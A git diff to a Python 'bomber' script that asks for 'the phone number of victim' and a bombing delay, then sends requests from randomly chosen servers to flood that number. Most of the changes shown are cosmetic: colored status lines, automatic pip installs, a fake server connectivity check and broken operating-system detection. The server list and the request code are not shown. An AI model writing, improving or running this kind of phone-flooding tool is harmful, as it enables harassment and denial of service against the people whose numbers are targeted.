@@ -1,44 +1,81 @@
-import os
+#!/usr/bin/python
 
+
+import os
+import datetime
+import time
+import random
+ 
+#Importing colorama
 try:
     from colorama import *
     print('[!] Checking for Requirements')
     print(" ")
-    print(Fore.LIGHTRED_EX + 'Colorama' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
+    print(Fore.LIGHTRED_EX + 'Colorama' + Fore.LIGHTWHITE_EX + ' [' + Fore.LIGHTGREEN_EX + '✓' + Fore.LIGHTWHITE_EX + ']')
 except Exception as e:
     print(e)
     print("'Colorama' was not found!")
     print("Installing colorama")
     os.system('pip install colorama')
     os.system("python3 pythonbomber.py")
-try:
-    import os
-    print(Fore.LIGHTRED_EX + 'os' + Fore.WHITE + '       [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
-except Exception as e:
-    print(e)
-    print(Fore.LIGHTRED_EX + "'os' was not found!")
-try:
-    import time
-    print(Fore.LIGHTRED_EX + 'time' + Fore.WHITE + '     [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
-except Exception as e:
-    print(e)
-    print(Fore.LIGHTRED_EX + "'time' was not found!")
-try:
-    import random
-    print(Fore.LIGHTRED_EX + 'random' + Fore.WHITE + '   [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
-except Exception as e:
-    print(e)
-try:
-    import datetime
-    print(Fore.LIGHTRED_EX + 'datetime' + Fore.WHITE + ' [' + Fore.GREEN + '✓' + Fore.WHITE + ']')
-except Exception as e:
-    print(e)
 
-input('Press enter to continue')
-os.system("clear")
+#Importing requests
+try:
+    import requests
+    print(Fore.LIGHTRED_EX + 'Requests' + Fore.LIGHTWHITE_EX + ' [' + Fore.LIGHTGREEN_EX + '✓' + Fore.LIGHTWHITE_EX + ']')
+except Exception as e:
+    print(e)
+    print('Installing Requests')
+    os.system('pip install requests')
+    os.system('python3 pythonbomber.py')
 
-print("""
-                      :::!~!!!!!:.             
+
+# Importing sys
+try:
+    import sys
+    print(Fore.LIGHTRED_EX + 'sys' + Fore.LIGHTWHITE_EX + '      [' + Fore.LIGHTGREEN_EX + '✓' + Fore.LIGHTWHITE_EX + ']')
+except Exception as e:
+    print(e)
+    print('Installing sys')
+    os.system('pip install sys')
+    os.system('python3 pythonbomber.py')
+print(" ")
+print(" ")
+input(" Press enter to continue...")
+# Now the Show begins...
+################################################### Har Har Mahadev ########################################################################
+
+
+def clr():
+    if os.name == "nt":
+        os.system("cls")
+    else:
+        os.system("clear")
+
+clr()
+
+def check_intr():
+    print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Connecting to Servers...')
+    try:
+        requests.get("https://herokuapp.com")
+        print(Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTGREEN_EX + "✓" + Fore.LIGHTWHITE_EX + "] " + Fore.LIGHTGREEN_EX + "Connection Stablished Successfully!!")
+        time.sleep(1)
+        clr()
+        pass
+    except Exception:
+        print(Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTRED_EX + "✗" + Fore.LIGHTWHITE_EX + "] " + Fore.LIGHTRED_EX + "Error! Can't connect to Servers.")
+        print(Fore.LIGHTWHITE_EX + "[" + Fore.LIGHTRED_EX + "✗" + Fore.LIGHTWHITE_EX + "] " + Fore.LIGHTRED_EX + "Poor Internet Connection!!")
+        sys.exit(2)
+
+
+check_intr()
+
+cols = [Fore.LIGHTBLUE_EX, Fore.LIGHTCYAN_EX, Fore.LIGHTRED_EX, Fore.LIGHTWHITE_EX, Fore.LIGHTYELLOW_EX]
+
+def logo():
+    print("""
+    
+                         :::!~!!!!!:.             
                   .xUHWH!! !!?M88WHX:.           
                 .X*#M@$!!  !X!M$$$$$$WWx:.      
                :!!!!!!?H! :!$!$$$$$$$$$$8X:    
@@ -57,16 +94,31 @@ W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
 .~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `         
 Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!            
 $R@i.~~ !     :   ~$$$$$B$$en:``              
-?MXT@Wx.~    :     ~"##*$$$$M~                
-""")
+?MXT@Wx.~    :     ~"##*$$$$M~          
+    """)
+
+
+logo()
+
+def dev_info():
+    print(Fore.LIGHTWHITE_EX + '[' + '\033[1;32m~' + Fore.WHITE + '] ' + Fore.GREEN + 'Collecting Info...')
+    if os.name == "posix":
+        print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTGREEN_EX + "Parrot Operating System Detected!!")
+    elif os.name == "kali":
+       print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTGREEN_EX + "Kali Linux Operating System Detected!!")        
+    else:
+        print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTGREEN_EX + os.name + " Detected!!") 
+
+dev_info()
 
 
 def startup_time():
     Time=datetime.datetime.now().strftime('%H:%M:%S')
-    os.system('')
-    print(' ')
-    print(' ')
-    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + '] ' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)    
+   # print(' ')
+    #print(' ')
+    print(Fore.WHITE + '[' + '\033[1;32m~' + Fore.WHITE + '] ' + Fore.GREEN + 'Tool Started at ' + Fore.CYAN + Time)  
+
+
 startup_time()
 
 number = input(Fore.WHITE + '[' + Fore.GREEN + '~' + Fore.WHITE + '] ' + Fore.GREEN + 'Enter the phone number of victim : ')
@@ -87,18 +139,15 @@ pair6 = [server6, server5, server4, server3, server2]
 
 pairs_lst = [pair1, pair2, pair3, pair4, pair5, pair6]
 
-Time=datetime.datetime.now().strftime("%H:%M:%S")
-
-def write_srvers():
+def write_servers():
     print(Fore.WHITE + '[' + Fore.LIGHTYELLOW_EX + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Configuring Request...')
     f = open("serverconf.txt", "w")
     l = random.choice(pairs_lst)
     f.writelines(l)
+    Time=datetime.datetime.now().strftime("%H:%M:%S")
     print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Started sending request at ' + Fore.LIGHTRED_EX + Time)
-   # print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Bombing from the servers -->')
-    #print(Fore.WHITE + ".")
-    #print(l)
     f.close()
+
 
 def read_servers():
     print(Fore.WHITE + '[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.GREEN + 'Getting Response from the servers...')
@@ -113,9 +162,11 @@ def read_servers():
     except Exception as e:
         print("✗"+e)
 
+
 def main():
-    write_srvers()
+    write_servers()
     read_servers() 
+
 
 def countdown(t):
     
@@ -128,7 +179,374 @@ def countdown(t):
     print(Fore.WHITE + '[' + Fore.LIGHTRED_EX + '!' + Fore.WHITE + '] ' + Fore.LIGHTRED_EX + ' 00:00' )
     main()
 
+
 t = input(Fore.WHITE + "[" + Fore.GREEN + "~" + Fore.WHITE + "] " + Fore.GREEN + "Enter Bombing Delay in 'Seconds': ")
 print(Fore.WHITE + "[" + Fore.YELLOW + "!" + Fore.WHITE + "] " + Fore.GREEN + "Bombing in")
 
 countdown(int(t))
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
